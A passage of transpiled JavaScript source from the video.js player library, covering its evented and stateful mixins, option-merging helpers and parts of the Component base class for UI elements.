   *         that will trigger the listener.
   *
   *         Another evented object can be passed here instead, which will
   *         cause the listener to listen for events on _that_ object.
   *
   *         In either case, the listener's `this` value will be bound to
   *         this object.
   *
   * @param  {string|Array|Function} typeOrListener
   *         If the first argument was a string or array, this should be the
   *         listener function. Otherwise, this is a string or array of event
   *         type(s).
   *
   * @param  {Function} [listener]
   *         If the first argument was another evented object, this will be
   *         the listener function.
   */
  on: function on$$1() {
    var _this = this;

    for (var _len = arguments.length, args = Array(_len), _key = 0; _key < _len; _key++) {
      args[_key] = arguments[_key];
    }

    var _normalizeListenArgs = normalizeListenArgs(this, args),
        isTargetingSelf = _normalizeListenArgs.isTargetingSelf,
        target = _normalizeListenArgs.target,
        type = _normalizeListenArgs.type,
        listener = _normalizeListenArgs.listener;

    listen(target, 'on', type, listener);

    // If this object is listening to another evented object.
    if (!isTargetingSelf) {

      // If this object is disposed, remove the listener.
      var removeListenerOnDispose = function removeListenerOnDispose() {
        return _this.off(target, type, listener);
      };

      // Use the same function ID as the listener so we can remove it later it
      // using the ID of the original listener.
      removeListenerOnDispose.guid = listener.guid;

      // Add a listener to the target's dispose event as well. This ensures
      // that if the target is disposed BEFORE this object, we remove the
      // removal listener that was just added. Otherwise, we create a memory leak.
      var removeRemoverOnTargetDispose = function removeRemoverOnTargetDispose() {
        return _this.off('dispose', removeListenerOnDispose);
      };

      // Use the same function ID as the listener so we can remove it later
      // it using the ID of the original listener.
      removeRemoverOnTargetDispose.guid = listener.guid;

      listen(this, 'on', 'dispose', removeListenerOnDispose);
      listen(target, 'on', 'dispose', removeRemoverOnTargetDispose);
    }
  },


  /**
   * Add a listener to an event (or events) on this object or another evented
   * object. The listener will only be called once and then removed.
   *
   * @param  {string|Array|Element|Object} targetOrType
   *         If this is a string or array, it represents the event type(s)
   *         that will trigger the listener.
   *
   *         Another evented object can be passed here instead, which will
   *         cause the listener to listen for events on _that_ object.
   *
   *         In either case, the listener's `this` value will be bound to
   *         this object.
   *
   * @param  {string|Array|Function} typeOrListener
   *         If the first argument was a string or array, this should be the
   *         listener function. Otherwise, this is a string or array of event
   *         type(s).
   *
   * @param  {Function} [listener]
   *         If the first argument was another evented object, this will be
   *         the listener function.
   */
  one: function one$$1() {
    var _this2 = this;

    for (var _len2 = arguments.length, args = Array(_len2), _key2 = 0; _key2 < _len2; _key2++) {
      args[_key2] = arguments[_key2];
    }

    var _normalizeListenArgs2 = normalizeListenArgs(this, args),
        isTargetingSelf = _normalizeListenArgs2.isTargetingSelf,
        target = _normalizeListenArgs2.target,
        type = _normalizeListenArgs2.type,
        listener = _normalizeListenArgs2.listener;

    // Targeting this evented object.


    if (isTargetingSelf) {
      listen(target, 'one', type, listener);

      // Targeting another evented object.
    } else {
      var wrapper = function wrapper() {
        for (var _len3 = arguments.length, largs = Array(_len3), _key3 = 0; _key3 < _len3; _key3++) {
          largs[_key3] = arguments[_key3];
        }

        _this2.off(target, type, wrapper);
        listener.apply(null, largs);
      };

      // Use the same function ID as the listener so we can remove it later
      // it using the ID of the original listener.
      wrapper.guid = listener.guid;
      listen(target, 'one', type, wrapper);
    }
  },


  /**
   * Removes listener(s) from event(s) on an evented object.
   *
   * @param  {string|Array|Element|Object} [targetOrType]
   *         If this is a string or array, it represents the event type(s).
   *
   *         Another evented object can be passed here instead, in which case
   *         ALL 3 arguments are _required_.
   *
   * @param  {string|Array|Function} [typeOrListener]
   *         If the first argument was a string or array, this may be the
   *         listener function. Otherwise, this is a string or array of event
   *         type(s).
   *
   * @param  {Function} [listener]
   *         If the first argument was another evented object, this will be
   *         the listener function; otherwise, _all_ listeners bound to the
   *         event type(s) will be removed.
   */
  off: function off$$1(targetOrType, typeOrListener, listener) {

    // Targeting this evented object.
    if (!targetOrType || isValidEventType(targetOrType)) {
      off(this.eventBusEl_, targetOrType, typeOrListener);

      // Targeting another evented object.
    } else {
      var target = targetOrType;
      var type = typeOrListener;

      // Fail fast and in a meaningful way!
      validateTarget(target);
      validateEventType(type);
      validateListener(listener);

      // Ensure there's at least a guid, even if the function hasn't been used
      listener = bind(this, listener);

      // Remove the dispose listener on this evented object, which was given
      // the same guid as the event listener in on().
      this.off('dispose', listener);

      if (target.nodeName) {
        off(target, type, listener);
        off(target, 'dispose', listener);
      } else if (isEvented(target)) {
        target.off(type, listener);
        target.off('dispose', listener);
      }
    }
  },


  /**
   * Fire an event on this evented object, causing its listeners to be called.
   *
   * @param   {string|Object} event
   *          An event type or an object with a type property.
   *
   * @param   {Object} [hash]
   *          An additional object to pass along to listeners.
   *
   * @returns {boolean}
   *          Whether or not the default behavior was prevented.
   */
  trigger: function trigger$$1(event, hash) {
    return trigger(this.eventBusEl_, event, hash);
  }
};

/**
 * Applies {@link module:evented~EventedMixin|EventedMixin} to a target object.
 *
 * @param  {Object} target
 *         The object to which to add event methods.
 *
 * @param  {Object} [options={}]
 *         Options for customizing the mixin behavior.
 *
 * @param  {String} [options.eventBusKey]
 *         By default, adds a `eventBusEl_` DOM element to the target object,
 *         which is used as an event bus. If the target object already has a
 *         DOM element that should be used, pass its key here.
 *
 * @return {Object}
 *         The target object.
 */
function evented(target) {
  var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
  var eventBusKey = options.eventBusKey;

  // Set or create the eventBusEl_.

  if (eventBusKey) {
    if (!target[eventBusKey].nodeName) {
      throw new Error('The eventBusKey "' + eventBusKey + '" does not refer to an element.');
    }
    target.eventBusEl_ = target[eventBusKey];
  } else {
    target.eventBusEl_ = createEl('span', { className: 'vjs-event-bus' });
  }

  assign(target, EventedMixin);

  // When any evented object is disposed, it removes all its listeners.
  target.on('dispose', function () {
    target.off();
    window_1.setTimeout(function () {
      target.eventBusEl_ = null;
    }, 0);
  });

  return target;
}

/**
 * @file mixins/stateful.js
 * @module stateful
 */
/**
 * Contains methods that provide statefulness to an object which is passed
 * to {@link module:stateful}.
 *
 * @mixin StatefulMixin
 */
var StatefulMixin = {

  /**
   * A hash containing arbitrary keys and values representing the state of
   * the object.
   *
   * @type {Object}
   */
  state: {},

  /**
   * Set the state of an object by mutating its
   * {@link module:stateful~StatefulMixin.state|state} object in place.
   *
   * @fires   module:stateful~StatefulMixin#statechanged
   * @param   {Object|Function} stateUpdates
   *          A new set of properties to shallow-merge into the plugin state.
   *          Can be a plain object or a function returning a plain object.
   *
   * @returns {Object|undefined}
   *          An object containing changes that occurred. If no changes
   *          occurred, returns `undefined`.
   */
  setState: function setState(stateUpdates) {
    var _this = this;

    // Support providing the `stateUpdates` state as a function.
    if (typeof stateUpdates === 'function') {
      stateUpdates = stateUpdates();
    }

    var changes = void 0;

    each(stateUpdates, function (value, key) {

      // Record the change if the value is different from what's in the
      // current state.
      if (_this.state[key] !== value) {
        changes = changes || {};
        changes[key] = {
          from: _this.state[key],
          to: value
        };
      }

      _this.state[key] = value;
    });

    // Only trigger "statechange" if there were changes AND we have a trigger
    // function. This allows us to not require that the target object be an
    // evented object.
    if (changes && isEvented(this)) {

      /**
       * An event triggered on an object that is both
       * {@link module:stateful|stateful} and {@link module:evented|evented}
       * indicating that its state has changed.
       *
       * @event    module:stateful~StatefulMixin#statechanged
       * @type     {Object}
       * @property {Object} changes
       *           A hash containing the properties that were changed and
       *           the values they were changed `from` and `to`.
       */
      this.trigger({
        changes: changes,
        type: 'statechanged'
      });
    }

    return changes;
  }
};

/**
 * Applies {@link module:stateful~StatefulMixin|StatefulMixin} to a target
 * object.
 *
 * If the target object is {@link module:evented|evented} and has a
 * `handleStateChanged` method, that method will be automatically bound to the
 * `statechanged` event on itself.
 *
 * @param   {Object} target
 *          The object to be made stateful.
 *
 * @param   {Object} [defaultState]
 *          A default set of properties to populate the newly-stateful object's
 *          `state` property.
 *
 * @returns {Object}
 *          Returns the `target`.
 */
function stateful(target, defaultState) {
  assign(target, StatefulMixin);

  // This happens after the mixing-in because we need to replace the `state`
  // added in that step.
  target.state = assign({}, target.state, defaultState);

  // Auto-bind the `handleStateChanged` method of the target object if it exists.
  if (typeof target.handleStateChanged === 'function' && isEvented(target)) {
    target.on('statechanged', target.handleStateChanged);
  }

  return target;
}

/**
 * @file to-title-case.js
 * @module to-title-case
 */

/**
 * Uppercase the first letter of a string.
 *
 * @param {string} string
 *        String to be uppercased
 *
 * @return {string}
 *         The string with an uppercased first letter
 */
function toTitleCase(string) {
  if (typeof string !== 'string') {
    return string;
  }

  return string.charAt(0).toUpperCase() + string.slice(1);
}

/**
 * Compares the TitleCase versions of the two strings for equality.
 *
 * @param {string} str1
 *        The first string to compare
 *
 * @param {string} str2
 *        The second string to compare
 *
 * @return {boolean}
 *         Whether the TitleCase versions of the strings are equal
 */
function titleCaseEquals(str1, str2) {
  return toTitleCase(str1) === toTitleCase(str2);
}

/**
 * @file merge-options.js
 * @module merge-options
 */
/**
 * Deep-merge one or more options objects, recursively merging **only** plain
 * object properties.
 *
 * @param   {Object[]} sources
 *          One or more objects to merge into a new object.
 *
 * @returns {Object}
 *          A new object that is the merged result of all sources.
 */
function mergeOptions() {
  var result = {};

  for (var _len = arguments.length, sources = Array(_len), _key = 0; _key < _len; _key++) {
    sources[_key] = arguments[_key];
  }

  sources.forEach(function (source) {
    if (!source) {
      return;
    }

    each(source, function (value, key) {
      if (!isPlain(value)) {
        result[key] = value;
        return;
      }

      if (!isPlain(result[key])) {
        result[key] = {};
      }

      result[key] = mergeOptions(result[key], value);
    });
  });

  return result;
}

/**
 * Player Component - Base class for all UI objects
 *
 * @file component.js
 */
/**
 * Base class for all UI Components.
 * Components are UI objects which represent both a javascript object and an element
 * in the DOM. They can be children of other components, and can have
 * children themselves.
 *
 * Components can also use methods from {@link EventTarget}
 */

var Component = function () {

  /**
   * A callback that is called when a component is ready. Does not have any
   * paramters and any callback value will be ignored.
   *
   * @callback Component~ReadyCallback
   * @this Component
   */

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   *
   * @param {Object[]} [options.children]
   *        An array of children objects to intialize this component with. Children objects have
   *        a name property that will be used if more than one component of the same type needs to be
   *        added.
   *
   * @param {Component~ReadyCallback} [ready]
   *        Function that gets called when the `Component` is ready.
   */
  function Component(player, options, ready) {
    classCallCheck(this, Component);


    // The component might be the player itself and we can't pass `this` to super
    if (!player && this.play) {
      this.player_ = player = this; // eslint-disable-line
    } else {
      this.player_ = player;
    }

    // Make a copy of prototype.options_ to protect against overriding defaults
    this.options_ = mergeOptions({}, this.options_);

    // Updated options with supplied options
    options = this.options_ = mergeOptions(this.options_, options);

    // Get ID from options or options element if one is supplied
    this.id_ = options.id || options.el && options.el.id;

    // If there was no ID from the options, generate one
    if (!this.id_) {
      // Don't require the player ID function in the case of mock players
      var id = player && player.id && player.id() || 'no_player';

      this.id_ = id + '_component_' + newGUID();
    }

    this.name_ = options.name || null;

    // Create element if one wasn't provided in options
    if (options.el) {
      this.el_ = options.el;
    } else if (options.createEl !== false) {
      this.el_ = this.createEl();
    }

    // if evented is anything except false, we want to mixin in evented
    if (options.evented !== false) {
      // Make this an evented object and use `el_`, if available, as its event bus
      evented(this, { eventBusKey: this.el_ ? 'el_' : null });
    }
    stateful(this, this.constructor.defaultState);

    this.children_ = [];
    this.childIndex_ = {};
    this.childNameIndex_ = {};

    // Add any child components in options
    if (options.initChildren !== false) {
      this.initChildren();
    }

    this.ready(ready);
    // Don't want to trigger ready here or it will before init is actually
    // finished for all children that run this constructor

    if (options.reportTouchActivity !== false) {
      this.enableTouchActivity();
    }
  }

  /**
   * Dispose of the `Component` and all child components.
   *
   * @fires Component#dispose
   */


  Component.prototype.dispose = function dispose() {

    /**
     * Triggered when a `Component` is disposed.
     *
     * @event Component#dispose
     * @type {EventTarget~Event}
     *
     * @property {boolean} [bubbles=false]
     *           set to false so that the close event does not
     *           bubble up
     */
    this.trigger({ type: 'dispose', bubbles: false });

    // Dispose all children.
    if (this.children_) {
      for (var i = this.children_.length - 1; i >= 0; i--) {
        if (this.children_[i].dispose) {
          this.children_[i].dispose();
        }
      }
    }

    // Delete child references
    this.children_ = null;
    this.childIndex_ = null;
    this.childNameIndex_ = null;

    if (this.el_) {
      // Remove element from DOM
      if (this.el_.parentNode) {
        this.el_.parentNode.removeChild(this.el_);
      }

      removeData(this.el_);
      this.el_ = null;
    }

    // remove reference to the player after disposing of the element
    this.player_ = null;
  };

  /**
   * Return the {@link Player} that the `Component` has attached to.
   *
   * @return {Player}
   *         The player that this `Component` has attached to.
   */


  Component.prototype.player = function player() {
    return this.player_;
  };

  /**
   * Deep merge of options objects with new options.
   * > Note: When both `obj` and `options` contain properties whose values are objects.
   *         The two properties get merged using {@link module:mergeOptions}
   *
   * @param {Object} obj
   *        The object that contains new options.
   *
   * @return {Object}
   *         A new object of `this.options_` and `obj` merged together.
   *
   * @deprecated since version 5
   */


  Component.prototype.options = function options(obj) {
    log$1.warn('this.options() has been deprecated and will be moved to the constructor in 6.0');

    if (!obj) {
      return this.options_;
    }

    this.options_ = mergeOptions(this.options_, obj);
    return this.options_;
  };

  /**
   * Get the `Component`s DOM element
   *
   * @return {Element}
   *         The DOM element for this `Component`.
   */


  Component.prototype.el = function el() {
    return this.el_;
  };

  /**
   * Create the `Component`s DOM element.
   *
   * @param {string} [tagName]
   *        Element's DOM node type. e.g. 'div'
   *
   * @param {Object} [properties]
   *        An object of properties that should be set.
   *
   * @param {Object} [attributes]
   *        An object of attributes that should be set.
   *
   * @return {Element}
   *         The element that gets created.
   */


  Component.prototype.createEl = function createEl$$1(tagName, properties, attributes) {
    return createEl(tagName, properties, attributes);
  };

  /**
   * Localize a string given the string in english.
   *
   * If tokens are provided, it'll try and run a simple token replacement on the provided string.
   * The tokens it looks for look like `{1}` with the index being 1-indexed into the tokens array.
   *
   * If a `defaultValue` is provided, it'll use that over `string`,
   * if a value isn't found in provided language files.
   * This is useful if you want to have a descriptive key for token replacement
   * but have a succinct localized string and not require `en.json` to be included.
   *
   * Currently, it is used for the progress bar timing.
   * ```js
   * {
   *   "progress bar timing: currentTime={1} duration={2}": "{1} of {2}"
   * }
   * ```
   * It is then used like so:
   * ```js
   * this.localize('progress bar timing: currentTime={1} duration{2}',
   *               [this.player_.currentTime(), this.player_.duration()],
   *               '{1} of {2}');
   * ```
   *
   * Which outputs something like: `01:23 of 24:56`.
   *
   *
   * @param {string} string
   *        The string to localize and the key to lookup in the language files.
   * @param {string[]} [tokens]
   *        If the current item has token replacements, provide the tokens here.
   * @param {string} [defaultValue]
   *        Defaults to `string`. Can be a default value to use for token replacement
   *        if the lookup key is needed to be separate.
   *
   * @return {string}
   *         The localized string or if no localization exists the english string.
   */


  Component.prototype.localize = function localize(string, tokens) {
    var defaultValue = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : string;

    var code = this.player_.language && this.player_.language();
    var languages = this.player_.languages && this.player_.languages();
    var language = languages && languages[code];
    var primaryCode = code && code.split('-')[0];
    var primaryLang = languages && languages[primaryCode];

    var localizedString = defaultValue;

    if (language && language[string]) {
      localizedString = language[string];
    } else if (primaryLang && primaryLang[string]) {
      localizedString = primaryLang[string];
    }

    if (tokens) {
      localizedString = localizedString.replace(/\{(\d+)\}/g, function (match, index) {
        var value = tokens[index - 1];
        var ret = value;

        if (typeof value === 'undefined') {
          ret = match;
        }

        return ret;
      });
    }

    return localizedString;
  };

  /**
   * Return the `Component`s DOM element. This is where children get inserted.
   * This will usually be the the same as the element returned in {@link Component#el}.
   *
   * @return {Element}
   *         The content element for this `Component`.
   */


  Component.prototype.contentEl = function contentEl() {
    return this.contentEl_ || this.el_;
  };

  /**
   * Get this `Component`s ID
   *
   * @return {string}
   *         The id of this `Component`
   */


  Component.prototype.id = function id() {
    return this.id_;
  };

  /**
   * Get the `Component`s name. The name gets used to reference the `Component`
   * and is set during registration.
   *
   * @return {string}
   *         The name of this `Component`.
   */


  Component.prototype.name = function name() {
    return this.name_;
  };

  /**
   * Get an array of all child components
   *
   * @return {Array}
   *         The children
   */


  Component.prototype.children = function children() {
    return this.children_;
  };

  /**
   * Returns the child `Component` with the given `id`.
   *
   * @param {string} id
   *        The id of the child `Component` to get.
   *
   * @return {Component|undefined}
   *         The child `Component` with the given `id` or undefined.
   */


  Component.prototype.getChildById = function getChildById(id) {
    return this.childIndex_[id];
  };

  /**
   * Returns the child `Component` with the given `name`.
   *
   * @param {string} name
   *        The name of the child `Component` to get.
   *
   * @return {Component|undefined}
   *         The child `Component` with the given `name` or undefined.
   */


  Component.prototype.getChild = function getChild(name) {
    if (!name) {
      return;
    }

    name = toTitleCase(name);

    return this.childNameIndex_[name];
  };

  /**
   * Add a child `Component` inside the current `Component`.
   *
   *
   * @param {string|Component} child
   *        The name or instance of a child to add.
   *
   * @param {Object} [options={}]
   *        The key/value store of options that will get passed to children of
   *        the child.
   *
   * @param {number} [index=this.children_.length]
   *        The index to attempt to add a child into.
   *
   * @return {Component}
   *         The `Component` that gets added as a child. When using a string the
   *         `Component` will get created by this process.
   */


  Component.prototype.addChild = function addChild(child) {
    var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    var index = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : this.children_.length;

    var component = void 0;
    var componentName = void 0;

    // If child is a string, create component with options
    if (typeof child === 'string') {
      componentName = toTitleCase(child);

      var componentClassName = options.componentClass || componentName;

      // Set name through options
      options.name = componentName;

      // Create a new object & element for this controls set
      // If there's no .player_, this is a player
      var ComponentClass = Component.getComponent(componentClassName);

      if (!ComponentClass) {
        throw new Error('Component ' + componentClassName + ' does not exist');
      }

      // data stored directly on the videojs object may be
      // misidentified as a component to retain
      // backwards-compatibility with 4.x. check to make sure the
      // component class can be instantiated.
      if (typeof ComponentClass !== 'function') {
        return null;
      }

      component = new ComponentClass(this.player_ || this, options);

      // child is a component instance
    } else {
      component = child;
    }

    this.children_.splice(index, 0, component);

    if (typeof component.id === 'function') {
      this.childIndex_[component.id()] = component;
    }

    // If a name wasn't used to create the component, check if we can use the
    // name function of the component
    componentName = componentName || component.name && toTitleCase(component.name());

    if (componentName) {
      this.childNameIndex_[componentName] = component;
    }

    // Add the UI object's element to the container div (box)
    // Having an element is not required
    if (typeof component.el === 'function' && component.el()) {
      var childNodes = this.contentEl().children;
      var refNode = childNodes[index] || null;

      this.contentEl().insertBefore(component.el(), refNode);
    }

    // Return so it can stored on parent object if desired.
    return component;
  };

  /**
   * Remove a child `Component` from this `Component`s list of children. Also removes
   * the child `Component`s element from this `Component`s element.
   *
   * @param {Component} component
   *        The child `Component` to remove.
   */


  Component.prototype.removeChild = function removeChild(component) {
    if (typeof component === 'string') {
      component = this.getChild(component);
    }

    if (!component || !this.children_) {
      return;
    }

    var childFound = false;

    for (var i = this.children_.length - 1; i >= 0; i--) {
      if (this.children_[i] === component) {
        childFound = true;
        this.children_.splice(i, 1);
        break;
      }
    }

    if (!childFound) {
      return;
    }

    this.childIndex_[component.id()] = null;
    this.childNameIndex_[component.name()] = null;

    var compEl = component.el();

    if (compEl && compEl.parentNode === this.contentEl()) {
      this.contentEl().removeChild(component.el());
    }
  };

  /**
   * Add and initialize default child `Component`s based upon options.
   */


  Component.prototype.initChildren = function initChildren() {
    var _this = this;

    var children = this.options_.children;

    if (children) {
      // `this` is `parent`
      var parentOptions = this.options_;

      var handleAdd = function handleAdd(child) {
        var name = child.name;
        var opts = child.opts;

        // Allow options for children to be set at the parent options
        // e.g. videojs(id, { controlBar: false });
        // instead of videojs(id, { children: { controlBar: false });
        if (parentOptions[name] !== undefined) {
          opts = parentOptions[name];
        }

        // Allow for disabling default components
        // e.g. options['children']['posterImage'] = false
        if (opts === false) {
          return;
        }

        // Allow options to be passed as a simple boolean if no configuration
        // is necessary.
        if (opts === true) {
          opts = {};
        }

        // We also want to pass the original player options
        // to each component as well so they don't need to
        // reach back into the player for options later.
        opts.playerOptions = _this.options_.playerOptions;

        // Create and add the child component.
        // Add a direct reference to the child by name on the parent instance.
        // If two of the same component are used, different names should be supplied
        // for each
        var newChild = _this.addChild(name, opts);

        if (newChild) {
          _this[name] = newChild;
        }
      };

      // Allow for an array of children details to passed in the options
      var workingChildren = void 0;
      var Tech = Component.getComponent('Tech');

      if (Array.isArray(children)) {
        workingChildren = children;
      } else {
        workingChildren = Object.keys(children);
      }

      workingChildren
      // children that are in this.options_ but also in workingChildren  would
      // give us extra children we do not want. So, we want to filter them out.
      .concat(Object.keys(this.options_).filter(function (child) {
        return !workingChildren.some(function (wchild) {
          if (typeof wchild === 'string') {
            return child === wchild;
          }
          return child === wchild.name;
        });
      })).map(function (child) {
        var name = void 0;
        var opts = void 0;

        if (typeof child === 'string') {
          name = child;
          opts = children[name] || _this.options_[name] || {};
        } else {
          name = child.name;
          opts = child;
        }

        return { name: name, opts: opts };
      }).filter(function (child) {
        // we have to make sure that child.name isn't in the techOrder since
        // techs are registerd as Components but can't aren't compatible
        // See https://github.com/videojs/video.js/issues/2772
        var c = Component.getComponent(child.opts.componentClass || toTitleCase(child.name));

        return c && !Tech.isTech(c);
      }).forEach(handleAdd);
    }
  };

  /**
   * Builds the default DOM class name. Should be overriden by sub-components.
   *
   * @return {string}
   *         The DOM class name for this object.
   *
   * @abstract
   */


  Component.prototype.buildCSSClass = function buildCSSClass() {
    // Child classes can include a function that does:
    // return 'CLASS NAME' + this._super();
    return '';
  };

  /**
   * Bind a listener to the component's ready state.
   * Different from event listeners in that if the ready event has already happened
   * it will trigger the function immediately.
   *
   * @return {Component}
   *         Returns itself; method can be chained.
   */


  Component.prototype.ready = function ready(fn) {
    var sync = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;

    if (!fn) {
      return;
    }

    if (!this.isReady_) {
      this.readyQueue_ = this.readyQueue_ || [];
      this.readyQueue_.push(fn);
      return;
    }

    if (sync) {
      fn.call(this);
    } else {
      // Call the function asynchronously by default for consistency
      this.setTimeout(fn, 1);
    }
  };

  /**
   * Trigger all the ready listeners for this `Component`.
   *
   * @fires Component#ready
   */


  Component.prototype.triggerReady = function triggerReady() {
    this.isReady_ = true;

    // Ensure ready is triggered asynchronously
    this.setTimeout(function () {
      var readyQueue = this.readyQueue_;

      // Reset Ready Queue
      this.readyQueue_ = [];

      if (readyQueue && readyQueue.length > 0) {
        readyQueue.forEach(function (fn) {
          fn.call(this);
        }, this);
      }

      // Allow for using event listeners also
      /**
       * Triggered when a `Component` is ready.
       *
       * @event Component#ready
       * @type {EventTarget~Event}
       */
      this.trigger('ready');
    }, 1);
  };

  /**
   * Find a single DOM element matching a `selector`. This can be within the `Component`s
   * `contentEl()` or another custom context.
   *
   * @param {string} selector
   *        A valid CSS selector, which will be passed to `querySelector`.
   *
   * @param {Element|string} [context=this.contentEl()]
   *        A DOM element within which to query. Can also be a selector string in
   *        which case the first matching element will get used as context. If
   *        missing `this.contentEl()` gets used. If  `this.contentEl()` returns
   *        nothing it falls back to `document`.
   *
   * @return {Element|null}
   *         the dom element that was found, or null
   *
   * @see [Information on CSS Selectors](https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Getting_Started/Selectors)
   */


  Component.prototype.$ = function $$$1(selector, context) {
    return $(selector, context || this.contentEl());
  };

  /**
   * Finds all DOM element matching a `selector`. This can be within the `Component`s
   * `contentEl()` or another custom context.
   *
   * @param {string} selector
   *        A valid CSS selector, which will be passed to `querySelectorAll`.
   *
   * @param {Element|string} [context=this.contentEl()]
   *        A DOM element within which to query. Can also be a selector string in
   *        which case the first matching element will get used as context. If
   *        missing `this.contentEl()` gets used. If  `this.contentEl()` returns
   *        nothing it falls back to `document`.
   *
   * @return {NodeList}
   *         a list of dom elements that were found
   *
   * @see [Information on CSS Selectors](https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Getting_Started/Selectors)
   */


  Component.prototype.$$ = function $$$$1(selector, context) {
    return $$(selector, context || this.contentEl());
  };

  /**
   * Check if a component's element has a CSS class name.
   *
   * @param {string} classToCheck
   *        CSS class name to check.
   *
   * @return {boolean}
   *         - True if the `Component` has the class.
   *         - False if the `Component` does not have the class`
   */


  Component.prototype.hasClass = function hasClass$$1(classToCheck) {
    return hasClass(this.el_, classToCheck);
  };

  /**
   * Add a CSS class name to the `Component`s element.
   *
   * @param {string} classToAdd
   *        CSS class name to add
   */


  Component.prototype.addClass = function addClass$$1(classToAdd) {
    addClass(this.el_, classToAdd);
  };

  /**
   * Remove a CSS class name from the `Component`s element.
   *
   * @param {string} classToRemove
   *        CSS class name to remove
   */


  Component.prototype.removeClass = function removeClass$$1(classToRemove) {
    removeClass(this.el_, classToRemove);
  };

  /**
   * Add or remove a CSS class name from the component's element.
   * - `classToToggle` gets added when {@link Component#hasClass} would return false.
   * - `classToToggle` gets removed when {@link Component#hasClass} would return true.
   *
   * @param  {string} classToToggle
   *         The class to add or remove based on (@link Component#hasClass}
   *
   * @param  {boolean|Dom~predicate} [predicate]
   *         An {@link Dom~predicate} function or a boolean
   */


  Component.prototype.toggleClass = function toggleClass$$1(classToToggle, predicate) {
    toggleClass(this.el_, classToToggle, predicate);
  };

  /**
   * Show the `Component`s element if it is hidden by removing the
   * 'vjs-hidden' class name from it.
   */


  Component.prototype.show = function show() {
    this.removeClass('vjs-hidden');
  };

  /**
   * Hide the `Component`s element if it is currently showing by adding the
   * 'vjs-hidden` class name to it.
   */


  Component.prototype.hide = function hide() {
    this.addClass('vjs-hidden');
  };

  /**
   * Lock a `Component`s element in its visible state by adding the 'vjs-lock-showing'
   * class name to it. Used during fadeIn/fadeOut.
   *
   * @private
   */


  Component.prototype.lockShowing = function lockShowing() {
    this.addClass('vjs-lock-showing');
  };

  /**
   * Unlock a `Component`s element from its visible state by removing the 'vjs-lock-showing'
   * class name from it. Used during fadeIn/fadeOut.
   *
   * @private
   */


  Component.prototype.unlockShowing = function unlockShowing() {
    this.removeClass('vjs-lock-showing');
  };

  /**
   * Get the value of an attribute on the `Component`s element.
   *
   * @param {string} attribute
   *        Name of the attribute to get the value from.
   *
   * @return {string|null}
   *         - The value of the attribute that was asked for.
   *         - Can be an empty string on some browsers if the attribute does not exist
   *           or has no value
   *         - Most browsers will return null if the attibute does not exist or has
   *           no value.
   *
   * @see [DOM API]{@link https://developer.mozilla.org/en-US/docs/Web/API/Element/getAttribute}
   */


  Component.prototype.getAttribute = function getAttribute$$1(attribute) {
    return getAttribute(this.el_, attribute);
  };

  /**
   * Set the value of an attribute on the `Component`'s element
   *
   * @param {string} attribute
   *        Name of the attribute to set.
   *
   * @param {string} value
   *        Value to set the attribute to.
   *
   * @see [DOM API]{@link https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute}
   */


  Component.prototype.setAttribute = function setAttribute$$1(attribute, value) {
    setAttribute(this.el_, attribute, value);
  };

  /**
   * Remove an attribute from the `Component`s element.
   *
   * @param {string} attribute
   *        Name of the attribute to remove.
   *
   * @see [DOM API]{@link https://developer.mozilla.org/en-US/docs/Web/API/Element/removeAttribute}
   */


  Component.prototype.removeAttribute = function removeAttribute$$1(attribute) {
    removeAttribute(this.el_, attribute);
  };

  /**
   * Get or set the width of the component based upon the CSS styles.
   * See {@link Component#dimension} for more detailed information.
   *
   * @param {number|string} [num]
   *        The width that you want to set postfixed with '%', 'px' or nothing.
   *
   * @param {boolean} [skipListeners]
   *        Skip the componentresize event trigger
   *
   * @return {number|string}
   *         The width when getting, zero if there is no width. Can be a string
   *           postpixed with '%' or 'px'.
   */


  Component.prototype.width = function width(num, skipListeners) {
    return this.dimension('width', num, skipListeners);
  };

  /**
   * Get or set the height of the component based upon the CSS styles.
   * See {@link Component#dimension} for more detailed information.
   *
   * @param {number|string} [num]
   *        The height that you want to set postfixed with '%', 'px' or nothing.
   *
   * @param {boolean} [skipListeners]
   *        Skip the componentresize event trigger
   *
   * @return {number|string}
   *         The width when getting, zero if there is no width. Can be a string
   *         postpixed with '%' or 'px'.
   */


  Component.prototype.height = function height(num, skipListeners) {
    return this.dimension('height', num, skipListeners);
  };

  /**
   * Set both the width and height of the `Component` element at the same time.
   *
   * @param  {number|string} width
   *         Width to set the `Component`s element to.
   *
   * @param  {number|string} height
   *         Height to set the `Component`s element to.
   */


  Component.prototype.dimensions = function dimensions(width, height) {
    // Skip componentresize listeners on width for optimization
    this.width(width, true);
    this.height(height);
  };

  /**
   * Get or set width or height of the `Component` element. This is the shared code
   * for the {@link Component#width} and {@link Component#height}.
   *
   * Things to know:
   * - If the width or height in an number this will return the number postfixed with 'px'.
   * - If the width/height is a percent this will return the percent postfixed with '%'
   * - Hidden elements have a width of 0 with `window.getComputedStyle`. This function
   *   defaults to the `Component`s `style.width` and falls back to `window.getComputedStyle`.
   *   See [this]{@link http://www.foliotek.com/devblog/getting-the-width-of-a-hidden-element-with-jquery-using-width/}
   *   for more information
   * - If you want the computed style of the component, use {@link Component#currentWidth}
   *   and {@link {Component#currentHeight}
   *
   * @fires Component#componentresize
   *
   * @param {string} widthOrHeight
   8        'width' or 'height'
   *
   * @param  {number|string} [num]
   8         New dimension
   *
   * @param  {boolean} [skipListeners]
   *         Skip componentresize event trigger
   *
   * @return {number}
   *         The dimension when getting or 0 if unset
   */


  Component.prototype.dimension = function dimension(widthOrHeight, num, skipListeners) {
    if (num !== undefined) {
      // Set to zero if null or literally NaN (NaN !== NaN)
      if (num === null || num !== num) {
        num = 0;
      }

      // Check if using css width/height (% or px) and adjust
      if (('' + num).indexOf('%') !== -1 || ('' + num).indexOf('px') !== -1) {
        this.el_.style[widthOrHeight] = num;
      } else if (num === 'auto') {
        this.el_.style[widthOrHeight] = '';
      } else {
        this.el_.style[widthOrHeight] = num + 'px';
      }

      // skipListeners allows us to avoid triggering the resize event when setting both width and height
      if (!skipListeners) {
        /**
         * Triggered when a component is resized.
         *
         * @event Component#componentresize
